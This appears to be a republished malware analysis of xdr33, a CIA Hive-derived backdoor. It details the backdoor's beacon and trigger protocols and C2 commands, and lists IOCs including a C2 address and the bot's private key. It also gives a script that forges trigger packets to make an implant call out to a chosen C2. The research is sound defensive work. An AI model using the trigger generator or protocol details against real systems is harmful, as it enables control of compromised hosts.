---
title: "Heads up! Xdr33, A Variant Of CIA’s HIVE  Attack Kit Emerges"
date: 2025-01-19
categories: 
  - "botnet"
  - "cybersecurity"
  - "cybersecurity-awareness"
  - "security"
  - "vulnerabilities"
tags: 
  - "backdoor"
  - "cia-hive"
---

# Overview

On Oct 21, 2022, 360Netlab's honeypot system captured a suspicious ELF file `ee07a74d12c0bb3594965b51d0e45b6f`, which propagated via F5 vulnerability with zero VT detection, our system observces that it communicates with IP `45.9.150.144` using SSL with **forged Kaspersky certificates**, this caught our attention. After further lookup, we confirmed that this sample was adapted from the leaked Hive project server source code from CIA. **This is the first time we caught a variant of the CIA HIVE attack kit in the wild**, and we named it `xdr33` based on its embedded Bot-side certificate `CN=xdr33`.

To summarize, xdr33 is a backdoor born from the CIA Hive project, its main purpose is to collect sensitive information and provide a foothold for subsequent intrusions. In terms of network communication, xdr33 uses XTEA or AES algorithm to encrypt the original traffic, and uses SSL with Client-Certificate Authentication mode enabled to further protect the traffic; in terms of function, there are two main tasks: beacon and trigger, of which beacon is periodically report sensitive information about the device to the hard-coded Beacon C2 and execute the commands issued by it, while the trigger is to monitor the NIC traffic to identify specific messages that conceal the Trigger C2, and when such messages are received, it establishes communication with the Trigger C2 and waits for the execution of the commands issued by it.

The functional schematic is shown below.

![](https://blog.netlab.360.com/content/images/2022/12/hive_function.png)

Hive uses the `BEACON_HEADER_VERSION` macro to define the specified version, which has a value of `29` on the Master branch of the source code and a value of `34` in `xdr33`, so perhaps xdr33 has had several rounds of iterative updates already. Comparing with the HIV source code, xdr33 has been updated in the following 5 areas:

- New CC instructions have been added
- Wrapping or expanding functions
- Structs have been reordered and extended
- Trigger message format
- Addition of CC operations to the Beacon task

These modifications to xdr33 are not very sophisticated in terms of implementation, and coupled with the fact that the vulnerability used in this spread is N-day, we tend to rule out the possibility that the CIA continued to improve on the leaked source code and consider it to be the result of a cyber attack group borrowing the leaked source code.

# Vulnerability Delivery Payload

The md5 of the Payload we captured is `ad40060753bc3a1d6f380a5054c1403a`, and its contents are shown below.

![](https://blog.netlab.360.com/content/images/2022/12/hive_logd.png)

The code is simple and straightforward, and its main purpose is to

- Download the next stage of the sample and disguise it as `/command/bin/hlogd`.
    
- Install `logd` service for persistence.
    

# Sample analysis

We captured only one sample of xdr33 for the X86 architecture, and its basic information is shown below.

```
MD5:ee07a74d12c0bb3594965b51d0e45b6f
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
Packer: None
```

Simply put, when xdr33 runs in the compromised device, it first decrypts all the configuration information, then checks if it has root/admin permissions, if not, it prints “Insufficient permissions. try again... “and exit; otherwise initialize various runtime parameters, such as C2, PORT, runtime interval, etc. Finally, the two functions beacon\_start and TriggerListen are used to open the two tasks of Beacon and Trigger.

![](https://blog.netlab.360.com/content/images/2022/12/hive_main.png)

The following article mainly analyzes the implementation of Beacon and Trigger from the perspective of binary inversion; at the same time, we also compare and analyze the source code to see what changes have occurred.

# Decrypting configuration information

xdr33 decodes the configuration information by the following code snippet decode\_str, its logic is very simple, i.e., byte-by-byte inverse.

![](https://blog.netlab.360.com/content/images/2022/12/hive_decode.png)

In IDA you can see that decode\_str has a lot of cross-references, 152 in total. To assist in the analysis, we implemented the IDAPython script Decode\_RES in the appendix to decrypt the configuration information.

![](https://blog.netlab.360.com/content/images/2022/12/hive_idaxref.png)

The decryption results are shown below, including Beacon C2 `45.9.150.144`, runtime prompt messages, commands to view device information, etc.

![](https://blog.netlab.360.com/content/images/2022/12/hive_config.png)

# Beacon Task

The main function of Beacon is to periodically collect PID, MAC, SystemUpTime, process and network related device information; then use bzip, XTEA algorithm to compress and encrypt the device information, and report to C2; finally wait for the execution of the commands issued by C2.

## 0x01: Information Collection

- MAC
    
    Query MAC by `SIOCGIFCON` or `SIOCGIFHWADDR`
    
    ![](https://blog.netlab.360.com/content/images/2022/12/hive_mac-1.png)
    
- SystemUpTime
    
    Collects system up time via /proc/uptime
    
    ![](https://blog.netlab.360.com/content/images/2022/12/hive_uptime.png)
    
- Process and network-related information
    
    Collect process, NIC, network connection, and routing information by executing the following 4 commands
    
    ![](https://blog.netlab.360.com/content/images/2022/12/hive_netinfo.png)
    

## 0x02: Information processing

Xdr33 combines different device information through the update\_msg function

![](https://blog.netlab.360.com/content/images/2022/12/hive_compose.png)

In order to distinguish different device information, Hive designed ADD\_HDR, which is defined as follows, and "3, 4, 5, 6" in the above figure represents different Header Type.

```
typedef struct __attribute__ ((packed)) add_header {
	unsigned short type;
	unsigned short length;
} ADD_HDR;

```

What does "3, 4, 5, 6" represent exactly? This depends on the definition of Header Types in the source code below. xdr33 is extended on this basis, with two new values 0 and 9, representing `Sha1[:32] of MAC`, and `PID of xdr33` respectively

![](https://blog.netlab.360.com/content/images/2022/12/hive_type.png)

Some of the information collected by xdr32 in the virtual machine is shown below, and it can be seen that it contains the device information with head type 0,1,2,7,9,3. 
![](https://blog.netlab.360.com/content/images/2022/12/hive_deviceinfo.png)

It is worth mentioning that type=0, `Sha1[:32] of MAC`, which means that it takes the first 32 bytes of MAC SHA1. Take the mac in the above figure as an example, its calculation process is as follows.

```
mac:00-0c-29-94-d9-43,remove "-"
result:00 0c 29 94 d9 43

sha1 of mac:
result:c55c77695b6fd5c24b0cf7ccce3e464034b20805

sha1[:32] of mac:
result:c55c77695b6fd5c24b0cf7ccce3e4640
```

When all the device information is combined, use bzip to compress it and add 2 bytes of `beacon_header_version` and 2 bytes of OS information in the header.  
![](https://blog.netlab.360.com/content/images/2023/01/hive_devicebzip.png)

## 0x03: Network Communication

The communication process between xdr33 and Beacon C2 contains the following 4 steps, and the details of each step will be analyzed in detail below.

- Two-way SSL authentication
- Obtain XTEA key
- Report XTEA encrypted device information to C2
- Execute the commands sent by C2

### Step1: Two-way SSL Authentication

Two-way SSL authentication requires Bot and C2 to confirm each other's identity, from the network traffic level, it is obvious that Bot and C2 request each other's certificate and verify the process.  
![](https://blog.netlab.360.com/content/images/2022/12/hive_certi.png)

The author of xdr33 uses the kaspersky.conf and thawte.conf templates in the source repository to generate the required Bot certificate, C2 certificate and CA certificate.  
![](https://blog.netlab.360.com/content/images/2022/12/hive_certconf.png)

The CA certificate, Bot certificate and PrivKey are hardcoded in xdr32 in DER format.  
![](https://blog.netlab.360.com/content/images/2022/12/hive_sslsock.png)

The Bot certificate can be viewed using `openssl x509 -in Cert -inform DER -noout -text`, where CN=xdr33, which is where the family name comes from.  
![](https://blog.netlab.360.com/content/images/2022/12/hive_botcert.png)

You can use `openssl s_client -connect 45.9.150.144:443` to see the C2 certificate. bot, C2 certificates are disguised as being related to kaspersky, reducing the suspiciousness of network traffic in this way.

![](https://blog.netlab.360.com/content/images/2022/12/hive_c2cert.png)

The CA certificates are shown below. From the validity of the 3 certificates, we presume that the start of this activity is after 2022.10.7. 
![](https://blog.netlab.360.com/content/images/2022/12/hive_ca.png)

### Step2: Obtain XTEA key

After establishing SSL communication between Bot and C2, Bot requests XTEA key from C2 via the following code snippet.  
![](https://blog.netlab.360.com/content/images/2023/01/hive_teakey.png)

The processing logic is.

1. Bot sends 64 bytes of data to C2 in the format of "length of device information length string (xor 5) + device information length string (xor 5) + random data".
    
2. Bot receives 32 bytes of data from C2 and gets 16 bytes of XTEA KEY from it, the equivalent python code to get the KEY is as follows.
    
    ```
    XOR_KEY=5
    def get_key(rand_bytes):
    	offset = (ord(rand_bytes[0]) ^ XOR_KEY) % 15
    	return  rand_bytes[(offset+1):(offset+17)]
    ```
    

### Step3: Report XTEA encrypted device information to C2

Bot uses the XTEA KEY obtained from Step2 to encrypt the device information and report it to C2. since the device information is large, it usually needs to be sent in chunks, Bot sends up to 4052 bytes at a time, and C2 replies with the number of bytes it has accepted.  
![](https://blog.netlab.360.com/content/images/2023/01/hive_teadevice.png)

It is also worth mentioning that XTEA encryption is only used in Step3, and the subsequent Step4 only uses the SSL-negotiated encryption suite for network traffic, and no longer uses XTEA.

### Step4: Waiting for execution command (new function added by xdr33)

After the device information is reported, C2 sends 8 bytes of task number N of this cycle to Bot, if N is equal to 0, it will sleep for a certain time and enter the next cycle of Beacon Task; if not, it will send 264 bytes of task. bot receives the task, parses it, and executes the corresponding instruction.  
![](https://blog.netlab.360.com/content/images/2023/01/hive_beaconwaitcmd.png)

The supported instructions are shown in the following table.

| Index | Function |
| --- | --- |
| 0x01 | Download File |
| 0x02 | Execute CMD with fake name "\[kworker/3:1-events\]" |
| 0x03 | Update |
| 0x04 | Upload File |
| 0x05 | Delete |
| 0x08 | Launch Shell |
| 0x09 | Socket5 Proxy |
| 0x0b | Update BEACONINFO |

## Network Traffic Example

### The actual step2 traffic generated by xdr33

![](https://blog.netlab.360.com/content/images/2023/01/hive_packet.png)

### The interaction in step3, and the traffic from step4

![](https://blog.netlab.360.com/content/images/2023/01/hive_packetB.png)

### What information can we get from this?？

1. The length of the device information length string, `0x1 ^ 0x5 = 0x4`
    
2. The length of the device information, 0x31,0x32,0x37,0x35 respectively xor 5 gives 4720
    
3. tea key `2E 09 9B 08 CF 53 BE E7 A0 BE 11 42 31 F4 45 3A`
    
4. C2 will confirm the length of the device information reported by the BOT, 4052+668 = 4720, which corresponds to the second point
    
5. The number of tasks in this cycle is `00 00 00 00 00 00 00`, i.e. there is no task, so no specific task of 264 bytes will be issued.
    

The encrypted device information can be decrypted by the following code, and the decrypted data is `00 22 00 14 42 5A 68 39`, which contains the `beacon_header_version + os + bzip magic`, and the previous analysis can correspond to one by one.

```
import hexdump
import struct

def xtea_decrypt(key,block,n=32,endian="!"):
    v0,v1 = struct.unpack(endian+"2L", block)
    k = struct.unpack(endian+"4L",key)
    delta,mask = 0x9e3779b9,0xffffffff
    sum = (delta * n) & mask
    for round in range(n):
        v1 = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
        sum = (sum - delta) & mask
        v0 = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
    return struct.pack(endian+"2L",v0,v1)

def decrypt_data(key,data):
    size = len(data)
    i = 0
    ptext = b''
    while i < size:
        if size - i >= 8:
            ptext += xtea_decrypt(key,data[i:i+8])
        i += 8
    return ptext
key=bytes.fromhex("""
2E 09 9B 08 CF 53 BE E7  A0 BE 11 42 31 F4 45 3A
""")
enc_buf=bytes.fromhex("""
65 d8 b1 f9 b8 37 37 eb
""")

hexdump.hexdump(decrypt_data(key,enc_buf))
```

# Trigger Task

The main function of the Trigger is to listen to all traffic and wait for the Triggger IP message in a specific format. Once the message and the Trigger Payload hidden in the message pass the layers of verification, the Bot establishes communication with the C2 in the Trigger Payload and waits for the execution of the instructions sent.

## 0x1: Listening for traffic

Use the function call `socket( PF_PACKET, SOCK_RAW, htons( ETH_P_IP ) )` to set RAW SOCKET to capture IP messages, and then the following code snippet to process IP messages, you can see that Tirgger supports TCP,UDP and the maximum length of message Payload is 472 bytes. This kind of traffic sniffing implementation will increase the CPU load, in fact using BPF-Filter on sockets will work better.

![](https://blog.netlab.360.com/content/images/2022/12/hive_snfpkt.png)

## 0x2: Checksum Trigger packets

TCP and UDP messages that meet the length requirement are further verified using the same check\_payload function.

![](https://blog.netlab.360.com/content/images/2022/12/hive_handxref.png)

**check\_payload**的代码如下所示:  
![](https://blog.netlab.360.com/content/images/2022/12/hive_checkpayload.png)

The processing logic can be seen as follows.

- Use CRC16/CCITT-FALSE algorithm to calculate the CRC16 value of offset 8 to 92 in the message to get crcValue
- The offset value of crcValue in the message is obtained by crcValue % 200+ 92, crcOffset
- Verify whether the data at crcOffset in the message is equal to crcValue, if it is equal, go to the next step
- Check if the data at crcOffset+2 in the message is an integer multiple of 127, if yes, go to the next step
- Trigger\_Payload is encrypted, the starting position is crcOffset+12, the length is 29 bytes. the starting position of Xor\_Key is crcValue%55+8, XOR the two byte by byte, we get Trigger\_Paylaod

So far it can be determined that the `Trigger message format` is as follows

![](https://blog.netlab.360.com/content/images/2022/12/hive_triggerpkt-1.png)

## 0x3: Checksum Trigger Payload

If the Trigger message passes the checksum, the check\_trigger function continues to check the Trigger Payload

![](https://blog.netlab.360.com/content/images/2022/12/hive_triggerfinal.png)

The processing logic can be seen as follows

- Take the last 2 bytes of the Trigger Payload and write it as crcRaw
- Set the last 2 bytes of the Trigger Payload to 0 and calculate its CRC16, which is called crcCalc
- Compare crcRaw and crcCalc, if they are equal, it means that the Trigger Payload is structurally valid.

Next, the SHA1 of the key in the Trigger Payload is calculated and compared with the hard-coded SHA1 `46a3c308401e03d3195c753caa14ef34a3806593` in the Bot. If it is equal, it means that the Trigger Payload is also valid in content, so we can go to the last step, establish communication with C2 in the Trigger Payload, and wait for the execution of its issued command.

The format of the `Trigger Payload` can be determined as follows.

![](https://blog.netlab.360.com/content/images/2022/12/hive_triggerfmt-1.png)

## 0x4: Execution of Trigger C2's command

After a Trigger message passes the checksum, the Bot actively communicates with the C2 specified in the Trigger Payload and waits for the execution of the instructions issued by the C2.

![](https://blog.netlab.360.com/content/images/2022/12/hive_triggercmd.png)

The supported instructions are shown in the following table.

| Index | Function |
| --- | --- |
| 0x00,0x00a | Exit |
| 0x01 | Download File |
| 0x02 | Execute CMD |
| 0x04 | Upload File |
| 0x05 | Delete |
| 0x06 | Shutdown |
| 0x08 | Launch SHELL |
| 0x09 | SOCKET5 PROXY |
| 0x0b | Update BEACONINFO |

It is worth noting that Trigger C2 differs from Beacon C2 in the details of communication; after establishing an SSL tunnel, Bot and Trigger C2 use a Diffie-Helllman key exchange to establish a shared key, which is used in the AES algorithm to create a second layer of encryption.  
![](https://blog.netlab.360.com/content/images/2022/12/hive_aes.png)

# Experiment

To verify the correctness of the reverse analysis of the Trigger part, we Patch the SHA1 value of xdr33, fill in the SHA1 of `NetlabPatched,Enjoy!` and implement the GenTrigger code in the appendix to generate UDP type Trigger messages.

![](https://blog.netlab.360.com/content/images/2022/12/hive_patchbylab.png)

We run the Patch in the virtual machine `192.168.159.133` after the xdr33 sample, the construction of C2 for `192.168.159.128:6666` Trigger Payload, and sent to 192.168.159.133 in the form of UDP. the final result is as follows, you can see the xdr33 in the implanted host after receiving the UDP Trigger message, and we expected the same, launched a communication request to the preset Trigger C2, Cool!

![](https://blog.netlab.360.com/content/images/2022/12/hive_vmware.png)

# Contact us

Readers are always welcomed to reach us on twitter or email us to netlab\[at\]360.cn.

# IOC

## sample

```
ee07a74d12c0bb3594965b51d0e45b6f

patched sample

af5d2dfcafbb23666129600f982ecb87
```

## C2

```
45.9.150.144:443
```

## BOT Private Key

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6XthqPjU3XFu8/4PMVQ4iqJbleXmXhbVWMPhY/sTndEcO5vQ
mIMNJc1mISZTNPzddXSrj0h9GJe0ix0CIZID3bHyZHLiqb/ewylFmqSOVkviG/Je
o17UAqhsNGpVu/l8FM3qCHJE7z+wBqHdwVIZMt9vLaLti2KyJV+j1F1GTk8X2jcI
4DnnVKJE81rSafzaX2JBc6J6hovFMMP9IGb2LwRQMZNtZqSus6JMolhkO0dtvxXK
yTm1k79HL3PlZdgKt6HJFoukwkWND8NNTbcBXDWWDdJ42g/1I0Z7tMkdKFgfjUut
90LXKRRuENcUrbi75L6P2FRwPnqvVv+3N25MZQIDAQABAoIBADtguG57kc8bWQdO
NljqPVLshXQyuop1Lh7b+gcuREffdVmnf745ne9eNDn8AC86m6uSV0siOUY21qCG
aRNWigsohSeMnB5lgGaLqXrxnI1P0RogYncT18ExSgtue41Jnoe/8mPhg6yAuuiE
49uVYHkyn5iwlc7b88hTcVvBuO6S7HPqqXbDEBSoKL0o60/FyPb0RKigprKooTo/
KVCRFDT6xpAGMnjZkSSBJB2cgRxQwkcyghMcLJBvsZXbYNihiXiiiwaLvk4ZeBtf
0hnb6Cty840juAIGKDiUELijd3JtVKaBy41KLrdsnC+8JU3RIVGPtPDbwGanvnCk
Ito7gqUCgYEA+MucFy8fcFJtUnOmZ1Uk3AitLua+IrIEp26IHgGaMKFA0hnGEGvb
ZmwkrFj57bGSwsWq7ZSBk8yHRP3HSjJLZZQIcnnTCQxHMXa+YvpuEKE5mQSMwnlu
YH9S2S0xQPi1yLQKjAVVt+zRuuJvMv0dOZAOfdib+3xesPv2fIBu0McCgYEA8D4/
zygeF5k4Omh0l235e08lkqLtqVLu23vJ0TVnP2LNh4rRu6viBuRW7O9tsFLng8L8
aIohdVdF/E2FnNBhnvoohs8+IeFXlD8ml4LC+QD6AcvcMGYYwLIzewODJ2d0ZbBI
hQthoAw9urezc2CLy0da7H9Jmeg26utwZJB4ZXMCgYEAyV9b/rPoeWxuCd+Ln3Wd
+O6Y5i5jVQfLlo1zZP4dBCFwqt2rn5z9H0CGymzWFhq1VCrT96pM2wkfr6rNBHQC
7LvNvoJ2WotykEmxPcG/Fny4du7k03+f5EEKGLhodlMYJ9P5+W1T/SOUefRO1vFi
FzZPVHLfhcUbi5rU3d7CUv8CgYBG82tu578zYvnbLhw42K7UfwRusRWVazvFsGJj
Ge17J9fhTtswHMwtEuSlJvTzHRjorf5TdW/6MqMlp1Ntg5FBHUo4vh3wbZeq3Zet
KV4hoesz+pv140EuL7LKgrgKPCCBI7XXLQxQ8yyL51LlIT9H8rPkopb/EDif2paf
7JbSBwKBgCY8+aO44uuR2dQm0SIUqnb0MigLRs1qcWIfDfHF9K116sGwSK4SD9vD
poCA53ffcrTi+syPiUuBJFZG7VGfWiNJ6GWs48sP5dgyBQaVq5hQofKqQAZAQ0f+
7TxBhBF4n2gc5AhJ3fQAOXZg5rgNqhAln04UAIlgQKO69fAvfzID
-----END RSA PRIVATE KEY-----

```

## BOT Certificate

```
-----BEGIN CERTIFICATE-----
MIIFJTCCBA2gAwIBAgIBAzANBgkqhkiG9w0BAQsFADCBzjELMAkGA1UEBhMCWkEx
FTATBgNVBAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYD
VQQKDBRUaGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlv
biBTZXJ2aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2Vy
dmVyIENBMSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29t
MB4XDTIyMTAwNzE5NTAwN1oXDTIzMDMxNjE5NTAwN1owgYExCzAJBgNVBAYTAlJV
MR0wGwYDVQQKDBRLYXNwZXJza3kgTGFib3JhdG9yeTEUMBIGA1UEAwwLRW5naW5l
ZXJpbmcxDjAMBgNVBAMMBXhkcjMzMQ8wDQYDVQQIDAZNb3Njb3cxDzANBgNVBAcM
Bk1vc2NvdzELMAkGA1UECwwCSVQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQDpe2Go+NTdcW7z/g8xVDiKoluV5eZeFtVYw+Fj+xOd0Rw7m9CYgw0lzWYh
JlM0/N11dKuPSH0Yl7SLHQIhkgPdsfJkcuKpv97DKUWapI5WS+Ib8l6jXtQCqGw0
alW7+XwUzeoIckTvP7AGod3BUhky328tou2LYrIlX6PUXUZOTxfaNwjgOedUokTz
WtJp/NpfYkFzonqGi8Uww/0gZvYvBFAxk21mpK6zokyiWGQ7R22/FcrJObWTv0cv
c+Vl2Aq3ockWi6TCRY0Pw01NtwFcNZYN0njaD/UjRnu0yR0oWB+NS633QtcpFG4Q
1xStuLvkvo/YVHA+eq9W/7c3bkxlAgMBAAGjggFXMIIBUzAMBgNVHRMBAf8EAjAA
MB0GA1UdDgQWBBRc0LAOwW4C6azovupkjX8R3V+NpjCB+wYDVR0jBIHzMIHwgBTz
BcGhW/F2gdgt/v0oYQtatP2x5aGB1KSB0TCBzjELMAkGA1UEBhMCWkExFTATBgNV
BAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYDVQQKDBRU
aGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlvbiBTZXJ2
aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2VydmVyIENB
MSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29tggEAMA4G
A1UdDwEB/wQEAwIF4DAWBgNVHSUBAf8EDDAKBggrBgEFBQcDAjANBgkqhkiG9w0B
AQsFAAOCAQEAGUPMGTtzrQetSs+w12qgyHETYp8EKKk+yh4AJSC5A4UCKbJLrsUy
qend0E3plARHozy4ruII0XBh5z3MqMnsXcxkC3YJkjX2b2EuYgyhvvIFm326s48P
o6MUSYs5CFxhhp/N0cqmqGgZL5V5evI7P8NpPcFhs7u1ryGDcK1MTtSSPNPy3F+c
d707iRXiRcLQmXQTcjmOVKrohA/kqqtdM5EUl75n9OLTinZcb/CQ9At+5Sn91AI3
ngd22cyLLC3O4F14L+hqwMd0ENSjanX38iZ2EY8hMpmNYwPOVSQZ1FpXqrkW1ArI
lHEtKB3YMeSXQHAsvBQD0AlW7R7JqHdreg==
-----END CERTIFICATE-----

```

## CA Certificate

```
-----BEGIN CERTIFICATE-----
MIIFXTCCBEWgAwIBAgIBADANBgkqhkiG9w0BAQsFADCBzjELMAkGA1UEBhMCWkEx
FTATBgNVBAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYD
VQQKDBRUaGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlv
biBTZXJ2aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2Vy
dmVyIENBMSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29t
MB4XDTIyMTAwNzE0MTEzOFoXDTQ3MTAwMTE0MTEzOFowgc4xCzAJBgNVBAYTAlpB
MRUwEwYDVQQIDAxXZXN0ZXJuIENhcGUxEjAQBgNVBAcMCUNhcGUgVG93bjEdMBsG
A1UECgwUVGhhd3RlIENvbnN1bHRpbmcgY2MxKDAmBgNVBAsMH0NlcnRpZmljYXRp
b24gU2VydmljZXMgRGl2aXNpb24xITAfBgNVBAMMGFRoYXd0ZSBQcmVtaXVtIFNl
cnZlciBDQTEoMCYGCSqGSIb3DQEJARYZcHJlbWl1bS1zZXJ2ZXJAdGhhd3RlLmNv
bTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMfHJIl4/Xdo896Rlyqr
3VcKnLAAqIJkpgl90Z6bxUDpwa41H3ZDa7As4ZO9xa+lXGn9XB9u34TqJPkyhSKg
3wYK02KTCwVMI/gf506KpFvocTHpScnXs0xUoxsM8qEiDV2pTe447rmyaLyWcT5d
hbzkPl0WuDmEWMhfC2R9z4+mlsbwMAy9PN/JYzxz7cR48qj4j9hhEwkJ1+yJKXBV
AV9CdgLYfJXrA7A4Hxgc0ECKJmpovskv/DlxM8RxOsHfVtyG4ZgqmRraxUelirlf
tLj0fIkLaP7xvo1QSgiqQffbBOiDg9PN3H2wezFOmeDg9RIR6qvhzhyNpZjANiiC
JzMCAwEAAaOCAUIwggE+MA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFPMFwaFb
8XaB2C3+/ShhC1q0/bHlMIH7BgNVHSMEgfMwgfCAFPMFwaFb8XaB2C3+/ShhC1q0
/bHloYHUpIHRMIHOMQswCQYDVQQGEwJaQTEVMBMGA1UECAwMV2VzdGVybiBDYXBl
MRIwEAYDVQQHDAlDYXBlIFRvd24xHTAbBgNVBAoMFFRoYXd0ZSBDb25zdWx0aW5n
IGNjMSgwJgYDVQQLDB9DZXJ0aWZpY2F0aW9uIFNlcnZpY2VzIERpdmlzaW9uMSEw
HwYDVQQDDBhUaGF3dGUgUHJlbWl1bSBTZXJ2ZXIgQ0ExKDAmBgkqhkiG9w0BCQEW
GXByZW1pdW0tc2VydmVyQHRoYXd0ZS5jb22CAQAwDgYDVR0PAQH/BAQDAgGGMA0G
CSqGSIb3DQEBCwUAA4IBAQDBqNA1WFp15AM8l7oDgqa/YHvoGmfcs48Ak8YtrDEF
tLRyz1+hr/hhfR8Hm1hZ0oj1vAzayhCGKdQTk42mq90dG4tViNYMq4mFKmOoVnw6
u4C8BCPfxmuyNFdw9TVqTjdwWqWM84VMg3Cq3ZrEa94DMOAXm3QXcDsar7SQn5Xw
LCsU7xKJc6gwk4eNWEGxFJwS0EwPhBkt1lH4OD11jH0Ukr5rRJvh1blUiOHPd3//
kzeXNozA9PwoH4wewqk8bXZhj5ZA9LR7rm+5OrCoWXofgn1Gi2yd+LWWCrE7NBWm
yRelxOSPRSQ1fvAVvuRrCnCJgKxG/2Ba2DLs95u6IxYX
-----END CERTIFICATE-----

```

# 附录

## 0x1 Decode\_RES

```
import idautils
import ida_bytes

def decode(addr,len):
    tmp=bytearray()
    
    buf=ida_bytes.get_bytes(addr,len)
    for i in buf:
        tmp.append(~i&0xff)

    print("%x, %s" %(addr,bytes(tmp)))
    ida_bytes.put_bytes(addr,bytes(tmp))
    idc.create_strlit(addr,addr+len)
    
calllist=idautils.CodeRefsTo(0x0804F1D8,1)
for addr in calllist:
    prev1Head=idc.prev_head(addr)
    if 'push    offset' in idc.generate_disasm_line(prev1Head,1) and idc.get_operand_type(prev1Head,0)==5:
        bufaddr=idc.get_operand_value(prev1Head,0)
        prev2Head=idc.prev_head(prev1Head)
        
        if 'push' in idc.generate_disasm_line(prev2Head,1) and idc.get_operand_type(prev2Head,0)==5:
            leng=idc.get_operand_value(prev2Head,0)
            decode(bufaddr,leng)

```

## 0x02 GenTrigger

```
import random
import socket

def crc16(data: bytearray, offset, length):
  if data is None or offset < 0 or offset > len(data) - 1 and offset + length > len(data):
    return 0
  crc = 0xFFFF
  for i in range(0, length):
    crc ^= data[offset + i] << 8
    for j in range(0, 8):
      if (crc & 0x8000) > 0:
        crc = (crc << 1) ^ 0x1021
      else:
        crc = crc << 1
  return crc & 0xFFFF

def Gen_payload(ip:str,port:int):
    out=bytearray()
    part1=random.randbytes(92)
    sum=crc16(part1,8,84)
  
    offset1=sum % 0xc8
    offset2=sum % 0x37
    padding1=random.randbytes(offset1)
    padding2=random.randbytes(8)
    
    
    host=socket.inet_aton(ip)
    C2=bytearray(b'x01')
    C2+=host
    C2+=int.to_bytes(port,2,byteorder="big")
    key=b'NetlabPatched,Enjoy!'
    C2 = C2+key +b'x00x00'
    c2sum=crc16(C2,0,29)
    C2=C2[:-2]
    C2+=(int.to_bytes(c2sum,2,byteorder="big"))

    flag=0x7f*10
    out+=part1
    out+=padding1
    out+=(int.to_bytes(sum,2,byteorder="big"))
    out+=(int.to_bytes(flag,2,byteorder="big"))
    out+=padding2

    tmp=bytearray()
    for i in range(29):
      tmp.append(C2[i] ^ out[offset2+8+i])
    out+=tmp

    leng=472-len(out)
    lengpadding=random.randbytes(random.randint(0,leng+1))
    out+=lengpadding

    return out
    
payload=Gen_payload('192.168.159.128',6666)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.sendto(payload,("192.168.159.133",2345))  # 任意端口

```

Go to Source
